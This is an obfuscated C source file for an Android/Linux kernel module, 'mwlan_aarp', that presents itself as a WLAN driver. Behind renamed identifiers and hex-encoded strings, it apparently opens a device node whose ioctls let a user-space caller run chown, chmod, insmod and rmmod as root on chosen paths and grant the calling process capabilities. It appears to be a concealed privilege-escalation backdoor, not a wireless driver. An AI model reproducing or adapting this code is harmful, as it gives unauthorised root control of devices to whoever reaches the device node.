/*
   'mwlan_aarp.c' Obfuscated by COBF (Version 1.06 2006-01-07 by BB) at Mon Dec 22 18:01:02 2014
*/
#include<linux/kernel.h>
#include<linux/version.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/in.h>
#include<linux/miscdevice.h>
#include<linux/syscalls.h>
#include<linux/kmod.h>
#include<linux/compat.h>
#include<net/ip.h>
#include<linux/module.h>
#include<linux/ctype.h>
#include<linux/time.h>
#include"cobf.h"
#ifdef _WIN32
#include"uncobf.h"
#include<wtypes.h>
#include"cobf.h"
#else
#ifdef bb92
#include"uncobf.h"
#include<linux/types.h>
#include"cobf.h"
#else
#include"uncobf.h"
#include<stddef.h>
#include<sys/types.h>
#include"cobf.h"
#endif
#endif
#ifdef _WIN32
bbb bb76 bb246;
#else
bbb bbd bb151, *bb129, *bb190;
#define bb140 1
#define bb239 0
bbb bb200 bb212, *bb258, *bb130;bbb bbd bb248, *bb147, *bb247;bbb bbz
bb119, *bb241, *bb154;bbb bb0 bb198, *bb137;bbb bbz bb0 bb135, *bb148
;bbb bb0 bb83, *bb155;bbb bbz bb0 bb68, *bb243;bbb bb68 bb196, *bb233
;bbb bb68 bb242, *bb229;bbb bb83 bb76, *bb122;bbb bb253 bb208;bbb
bb191 bb215;bbb bb141 bb9;bbb bb105 bb96;bbb bb105 bb193;
#ifdef bb232
bbb bb153 bb57, *bb91;bbb bb254 bb34, *bb98;bbb bb194 bbj, *bb46;bbb
bb125 bb70, *bb110;
#else
bbb bb170 bb57, *bb91;bbb bb203 bb34, *bb98;bbb bb259 bbj, *bb46;bbb
bb142 bb70, *bb110;
#endif
bbb bb57 bb45, *bb58, *bb173;bbb bb34 bb197, *bb234, *bb174;bbb bb34
bb138, *bb221, *bb176;bbb bbj bb88, *bb144, *bb207;bbb bb9 bb40, *
bb160, *bb238;bbb bbj bb226, *bb236, *bb188;bbb bb96 bb146, *bb213, *
bb195;bbb bb70 bb204, *bb220, *bb189;
#define bb139 bbu
bbb bbu*bb224, *bb255;bbb bbt bbu*bb182;bbb bbc bb123;bbb bbc*bb231;
bbb bbt bbc*bb187;
#if defined( bb92)
bbb bbd bb107;
#endif
bbb bb107 bb20;bbb bb20*bb120;bbb bbt bb20*bb228;
#if defined( bb152) || defined( bb171)
bbb bb20 bb43;bbb bb20 bb89;
#else
bbb bbc bb43;bbb bbz bbc bb89;
#endif
bbb bbt bb43*bb257;bbb bb43*bb134;bbb bb88 bb201, *bb250;bbb bbu*
bb104;bbb bb104*bb184;
#define bb166( bb39) bbm bb39##__ { bbd bb126; }; bbb bbm bb39##__  * \
 bb39
bbb bbm{bb40 bb165,bb179,bb223,bb218;}bb252, *bb214, *bb161;bbb bbm{
bb40 bb217,bb209;}bb159, *bb133, *bb192;bbb bbm{bb40 bb240,bb225;}
bb263, *bb210, *bb249;
#endif
bbb bbt bb45*bb156;
#ifdef _WIN32
#ifndef UNDER_CE
#define bb26 bb116
#define bb47 bb219
bbb bbz bb0 bb26;bbb bb0 bb47;
#endif
#else
#endif
#ifdef _WIN32
bbu*bb41(bb26 bb112);bbu bb32(bbu* );bbu*bb78(bb26 bb244,bb26 bb112);
#else
#define bb41( bbg) bb72(1, bbg, bb54)
#define bb32( bbg) bb177( bbg)
#define bb78( bbg, bb36) bb72( bbg, bb36, bb54)
#endif
#ifdef _WIN32
#define bb49( bbg) bb124( bbg)
#else
#ifdef _DEBUG
bbd bb100(bbt bbc*bb251,bbt bbc*bb4,bbz bb222);
#define bb49( bbg) ( bbu)(( bbg) || ( bb100(# bbg, __FILE__, __LINE__ \
)))
#else
#define bb49( bbg) (( bbu)0)
#endif
#endif
bb47 bb158(bb47*bb245);
#ifndef _WIN32
bbd bb128(bbt bbc*bb260);bbd bb118(bbt bbc*bb164,...);
#endif
#ifdef _WIN32
bbb bb150 bb93;
#define bb79( bbg) bb181( bbg)
#define bb74( bbg) bb143( bbg)
#define bb84( bbg) bb256( bbg)
#define bb102( bbg) bb261( bbg)
#else
bbb bb206 bb93;
#define bb79( bbg) ( bbu)(  *  bbg = bb227( bbg))
#define bb74( bbg) (( bbu)0)
#define bb84( bbg) bb127( bbg)
#define bb102( bbg) bb117( bbg)
#endif
bbb bbm{bb58 bb14;bbj bb38;bb58 bb6;bbj bb5;bbj bbr;}bb21;bbb bbm{bbt
bbc*bbk;bbj bb25;bbj bb27;}bb28;bbb bbm{bbt bbc*bbk;bbj bb10;}bb29;
bbb bbm{bbj bb24;bbt bbc*bb3;}bb35;
#ifdef CONFIG_COMPAT
bbb bbm{bb19 bb14;bbj bb38;bb19 bb6;bbj bb5;bbj bbr;}bb62;bbb bbm{
bb19 bbk;bbj bb25;bbj bb27;}bb55;bbb bbm{bb19 bbk;bbj bb10;}bb56;bbb
bbm{bb9 bb24;bb19 bb3;}bb69;
#endif
bbq bbd bb82(bbm bb44*bb44,bbm bb4*bb4){bbp 0 ;}bbq bbd bb94(bbm bb44*
bb44,bbm bb4*bb4){bbp 0 ;}
#if bb52( 3, 8, 0 ) <= LINUX_VERSION_CODE && LINUX_VERSION_CODE <  \
bb52( 3, 9, 0 )
#define bb17( bbg, bb36, bb85, bb80) bb216( bbg, bb36, bb85, bb80)
#else
bbq bbd bb17(bbc*bbk,bbc* *bbv,bbc* *bbw,bbd bb53){bbm bb169*bb22;
bb199 bb61=(bb53==bb162)?bb54:bb121;
#ifdef _DEBUG
bbc* *bb48=bbv;bbe("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x25\x73",bbk);bb99( *bb48){
bbe("\x20\x25\x73", *bb48);bb48++;}bbe("\n");
#endif
#if LINUX_VERSION_CODE >= bb52( 3, 10, 0 )
bb22=bb75(bbk,bbv,bbw,bb61,bbs,bbs,bbs);
#else
bb22=bb75(bbk,bbv,bbw,bb61);
#endif
bbf(bb22==bbs){bbe("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x69\x6e\x66\x6f\x20\x3d\x3d"
"\x20\x4e\x55\x4c\x4c\n");bbp-bb31;}bbp bb186(bb22,bb53);}
#endif
#if defined( PLAT_VER) && PLAT_VER >= 0x50000
#define bb18 "/system/bin/mwlan_helper"
#else
#define bb18 "/system/bin/toolbox"
#endif
bbq bbd bb111(bbt bbc*bbk,bbd bb81,bbd bb86){bbc bb51[256 ];bbc*bbv[]=
{(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f"
"\x77\x6e",bb51,(bbc* )bbk,bbs};bbq bbc*bbw[]={"\x48\x4f\x4d\x45\x3d"
"\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48"
"\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbs};bbd bba;bb87(
bb51,"\x25\x64\x2e\x25\x64",bb81,bb86);bba=bb17(bb18,bbv,bbw,bb42);
#ifdef _DEBUG
bbe("\x63\x68\x6f\x77\x6e\x5f\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65"
"\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",
bba);
#endif
bbp bba;}bbq bbd bb103(bbt bbc*bbk,bbd bb10){bbc bb60[256 ];bbc*bbv[]=
{(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6d"
"\x6f\x64",bb60,(bbc* )bbk,bbs};bbd bba;bbq bbc*bbw[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbs};bb87(
bb60,"\x25\x6f",bb10);bba=bb17(bb18,bbv,bbw,bb42);
#ifdef _DEBUG
bbe("\x63\x68\x6d\x6f\x64\x5f\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65"
"\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",
bba);
#endif
bbp bba;}bb37 bbq bbd bb50(bb9*bb2,bb28*bbl){bbc bbk[256 ];bbd bba=
bb11(bbk,bbl->bbk,bb23(bbk));bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f"
"\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbp bba;} *bb2=
bb111(bbk,bbl->bb25,bbl->bb27);
#ifdef _DEBUG
bbe("\x63\x68\x6f\x77\x6e\n");
#endif
bbp 0 ;}bb37 bbq bbd bb59(bb9*bb2,bb29*bbl){bbc bbk[256 ];bbd bba=bb11(
bbk,bbl->bbk,bb23(bbk));bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63\x65\x5f"
"\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f"
"\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbp bba;} *bb2=bb103(bbk,
bbl->bb10);
#ifdef _DEBUG
bbe("\x63\x68\x6d\x6f\x64\n");
#endif
bbp 0 ;}bb37 bbq bbd bb71(bb9*bb2,bb35*bbl){bbc bb3[256 ];bbc*bbv[]={
bbs,bb3,bbs};bbq bbc*bbw[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52"
"\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73"
"\x74\x65\x6d\x2f\x62\x69\x6e",bbs};bbd bba=bb11(bb3,bbl->bb3,bb23(
bb3));bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74"
"\x6c\x2c\x20\x4f\x49\x44\x5f\x4d\x4f\x44\x2c\x20\x63\x6f\x70\x79\x5f"
"\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbp bba
;}bbv[0 ]=bbl->bb24?"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f"
"\x69\x6e\x73\x6d\x6f\x64":"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69"
"\x6e\x2f\x72\x6d\x6d\x6f\x64"; *bb2=bb17(bb18,bbv,bbw,bb42);
#ifdef _DEBUG
bbe("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x5f\x6d\x6f\x64"
"\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65"
"\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n", *bb2);
#endif
bbp 0 ;}bb37 bbq bbd bb63(bb9*bb2){bbd bba;bb180{bbm bb185*bbx=bb237();
bbf(!bbx){bba=bb31;bby;}bbx->bb65.bb12[0 ]=(1 <<bb131)|(1 <<bb172)|(1 <<
bb235);bbx->bb108.bb12[0 ]=0 ;bbx->bb106.bb12[0 ]=bbx->bb65.bb12[0 ];bbx
->bb65.bb12[1 ]=0 ;bbx->bb108.bb12[1 ]=0 ;bbx->bb106.bb12[1 ]=0 ; *bb2=
bb230(bbx);}bb99(0 );
#ifdef _DEBUG
bbe("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x5f\x63\x61\x70"
"\x2c\x20\x63\x61\x70\x73\x65\x74\x3a\x20\x25\x64\n", *bb2);
#endif
bbp 0 ;}bbq bb0 bb95(bbm bb4*bb4,bbz bbd bb113,bbz bb0 bb33){bbj bb16;
bb21 bbh, *bb64=(bb21* )bb33;bb45*bbi=bbs;bbd bba;bbe("\x6d\x77\x6c"
"\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x62\x65\x67\x69\x6e\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bba=bb11(&bbh,bb64,bb23(bb21));
bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c"
"\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20"
"\x25\x64\n",bba);bbo bbn;}bbi=bb41(bbh.bb5);bbf(!bbi){bba=-bb31;bbe(""
"\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x6d\x61\x6c"
"\x6c\x6f\x63\x3a\x20\x25\x64\n",bba);bbo bbn;}bba=bb77(bb16,(bb46)bbh
.bb14);bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74"
"\x6c\x2c\x20\x67\x65\x74\x5f\x75\x73\x65\x72\x3a\x20\x25\x64\n",bba);
bbo bbn;}bba=bb11(bbi,bbh.bb6,bbh.bb5);bbf(bba!=0 ){bbe("\x64\x65\x76"
"\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66"
"\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbo bbn;}
bb97(bb16){bb7 1 :{bba=bb50((bbj* )bbi,(bb28* )bbi);bbf(bba!=0 )bbo bbn
;bbh.bbr=4 ;}bby;bb7 2 :{bba=bb59((bbj* )bbi,(bb29* )bbi);bbf(bba!=0 )bbo
bbn;bbh.bbr=4 ;}bby;bb7 3 :{bba=bb71((bbj* )bbi,(bb35* )bbi);bbf(bba!=0
)bbo bbn;bbh.bbr=4 ;}bby;bb7 5 :{bba=bb63((bbj* )bbi);bbf(bba!=0 )bbo bbn
;bbh.bbr=4 ;}bby;}bba=bb73(bbh.bb6,bbi,bbh.bbr);bbf(bba!=0 ){bbe("\x64"
"\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79"
"\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbo
bbn;}bba=bb90(bbh.bbr,&bb64->bbr);bbf(bba!=0 ){bbe("\x64\x65\x76\x69"
"\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x70\x75\x74\x5f\x75\x73\x65"
"\x72\x2c\x20\x25\x64\n",bba);bbo bbn;}bbn:bbf(!bbi)bb32(bbi);bbe(""
"\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x65\x6e\x64\x20\x64"
"\x65\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbp bba;}
#ifdef CONFIG_COMPAT
bbq bb0 bb109(bbm bb4*bb145,bbz bbd bb113,bbz bb0 bb33){bbj bb16;bb62
bb8, *bb67=(bb62* )bb13(bb33);bb21 bbh;bb45*bbi=bbs;bbd bba;bbe("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x62\x65\x67\x69\x6e\x20"
"\x64\x65\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bba=bb11(&bb8,bb67,bb23
(bb8));bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63\x65\x5f\x63\x6f\x6d\x70"
"\x61\x74\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72"
"\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbo bbn;}bbh.
bb14=bb13(bb8.bb14);bbh.bb38=bb8.bb38;bbh.bb6=bb13(bb8.bb6);bbh.bb5=
bb8.bb5;bbi=bb41(bbh.bb5);bbf(!bbi){bba=-bb31;bbe("\x64\x65\x76\x69"
"\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x6d\x61\x6c\x6c\x6f\x63\x3a"
"\x20\x25\x64\n",bba);bbo bbn;}bba=bb77(bb16,(bb46)bbh.bb14);bbf(bba
!=0 ){bbe("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20"
"\x67\x65\x74\x5f\x75\x73\x65\x72\x3a\x20\x25\x64\n",bba);bbo bbn;}
bba=bb11(bbi,bbh.bb6,bbh.bb5);bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f"
"\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbo bbn;}bb97(bb16){
bb7 1 :{bb55*bb1=(bb55* )bbi;bb28 bbl;bbl.bbk=bb13(bb1->bbk);bbl.bb25=
bb1->bb25;bbl.bb27=bb1->bb27;bba=bb50((bbj* )bbi,&bbl);bbf(bba!=0 )bbo
bbn;bbh.bbr=4 ;}bby;bb7 2 :{bb56*bb1=(bb56* )bbi;bb29 bbl;bbl.bbk=bb13(
bb1->bbk);bbl.bb10=bb1->bb10;bba=bb59((bbj* )bbi,&bbl);bbf(bba!=0 )bbo
bbn;bbh.bbr=4 ;}bby;bb7 3 :{bb69*bb1=(bb69* )bbi;bb35 bbl;bbl.bb24=bb1
->bb24;bbl.bb3=bb13(bb1->bb3);bba=bb71((bbj* )bbi,&bbl);bbf(bba!=0 )bbo
bbn;bbh.bbr=4 ;}bby;bb7 5 :{bba=bb63((bbj* )bbi);bbf(bba!=0 )bbo bbn;bbh
.bbr=4 ;}bby;}bba=bb73(bbh.bb6,bbi,bbh.bbr);bbf(bba!=0 ){bbe("\x64\x65"
"\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f"
"\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bba);bbo bbn
;}bba=bb90(bbh.bbr,&bb67->bbr);bbf(bba!=0 ){bbe("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x70\x75\x74\x5f\x75\x73\x65\x72"
"\x2c\x20\x25\x64\n",bba);bbo bbn;}bbn:bbf(!bbi)bb32(bbi);bbe("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x65\x6e\x64\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbp bba;}
#endif
bbq bbm bb175 bb115={.bb157=bb95,
#ifdef CONFIG_COMPAT
.bb136=bb109,
#endif
.bb205=bb82,.bb262=bb94,};bbq bbm bb211 bb30={bb167,"\x6d\x77\x6c\x61"
"\x6e\x5f\x61\x61\x72\x70",&bb115};bbd bb202(){bbd bba;bbe("\x49\x2d"
"\x57\x4c\x41\x4e\x2f\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20"
"\x6d\x77\x6c\x61\x6e\x20\x6b\x6f\x20\x73\x72\x63\x2c\x20\x32\x30\x31"
"\x34\x2e\x31\x32\x2e\x31\x38\n");bba=bb163(&bb30);bbf(bba!=0 ){bbe(""
"\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x6d\x69\x73\x63"
"\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x20\x66\x61\x69\x6c\x65\x64\x3a"
"\x20\x25\x64\n",bba);bbp bba;}{bbc*bbv[]={"\x2f\x73\x79\x73\x74\x65"
"\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f\x77\x6e","\x73\x79\x73\x74\x65"
"\x6d\x2e\x73\x79\x73\x74\x65\x6d","\x2f\x64\x65\x76\x2f" "\x6d\x77"
"\x6c\x61\x6e\x5f\x61\x61\x72\x70",bbs};bbq bbc*bbw[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbs};bbd
bb15,bb66=0 ;bb132(bb15=0 ;bb15<10 ;bb15++){bba=bb17(bb18,bbv,bbw,bb42);
bbf(bba==0 )bby;bb66=bba;bb178(10 );}bbf(bb15!=0 ){bbe("\x69\x6e\x69\x74"
"\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65"
"\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x20\x66\x61\x69\x6c"
"\x65\x64\x2c\x20\x72\x5f\x20\x3a\x20\x25\x64\x2c\x20\x74\x72\x79\x20"
"\x3a\x20\x25\x64\n",bb66,bb15);bbf(bba!=0 ){bb101(&bb30);bbp bba>0 ?-
bba:bba;}}}bbe("\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x20\x69\x6e"
"\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x28\x29\x20\x77\x61\x73\x20\x73"
"\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x2e\n");bbp 0 ;}bbu bb149(){
bb101(&bb30);}bb168("\x61\x68\x6f\x70\x65");bb183("");
